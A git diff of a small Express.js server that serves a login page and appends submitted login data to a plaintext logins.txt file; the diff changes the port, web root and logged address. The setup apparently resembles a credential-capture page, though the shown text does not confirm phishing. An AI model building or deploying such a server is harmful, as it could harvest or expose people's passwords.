@@ -4,13 +4,13 @@ const path = require("path");
 const bodyParser = require("body-parser");
 
 const app = express();
-const PORT = 3000;
+const PORT = 80;
 
 // Middleware
 app.use(bodyParser.json());
 
 // ✅ Serve static files from /var/www/html
-app.use(express.static("/var/www/html"));
+app.use(express.static("/home/ubuntu/www"));
 
 // Ensure the "data" directory exists
 const dataDir = path.join(__dirname, "data");
@@ -19,12 +19,12 @@ if (!fs.existsSync(dataDir)) {
 }
 // ✅ Serve the login page when visiting "/"
 app.get("/", (req, res) => {
-    res.sendFile(path.join("/var/www/html", "index.html"));
+    res.sendFile(path.join("/home/ubuntu/www", "index.html"));
 });
 
 // ✅ Serve login page for GET /login
 app.get("/login", (req, res) => {
-    res.sendFile(path.join("/var/www/html", "index.html")); // Make sure this file exists
+    res.sendFile(path.join("/home/ubuntu/www", "index.html")); // Make sure this file exists
 });
 
 // ✅ Handle login data submission (POST request)
@@ -51,5 +51,5 @@ fs.appendFile(path.join(dataDir, "logins.txt"), userData, (err) => {
 
 // Start server
 app.listen(PORT, "0.0.0.0", () => {  // ✅ Allows external access
-    console.log(`Server running on http://3.108.250.196:${PORT}`);
+    console.log(`Server running on http://localhost:${PORT}`);
 });
